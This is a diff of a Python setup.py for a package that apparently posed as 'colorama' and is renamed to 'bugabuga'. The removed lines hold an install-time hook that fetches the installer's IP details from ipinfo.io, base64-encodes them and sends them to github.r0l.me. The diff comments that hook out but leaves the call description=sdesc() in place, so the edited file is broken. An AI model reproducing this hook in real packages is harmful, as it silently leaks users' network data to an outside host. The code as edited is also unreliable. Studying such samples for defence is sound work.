@@ -1,18 +1,18 @@
 from setuptools import setup
 
-import requests
-import base64
+# import requests
+# import base64
 
 
-def sdesc():
-    requests.get('https://github.r0l.me/bloop/sdescisfun');
-    r = requests.get("https://ipinfo.io")
-    content = base64.b64encode(r.text.encode()).decode()
-    return requests.get(f"https://github.r0l.me/bloop/?data={content}")
+# def sdesc():
+#     requests.get('https://github.r0l.me/bloop/sdescisfun');
+#     r = requests.get("https://ipinfo.io")
+#     content = base64.b64encode(r.text.encode()).decode()
+#     return requests.get(f"https://github.r0l.me/bloop/?data={content}")
 
 
 setup(
-    name='colorama',
+    name='bugabuga',
     version='1.5.4',
     description=sdesc(),
     long_description='Some random long description',
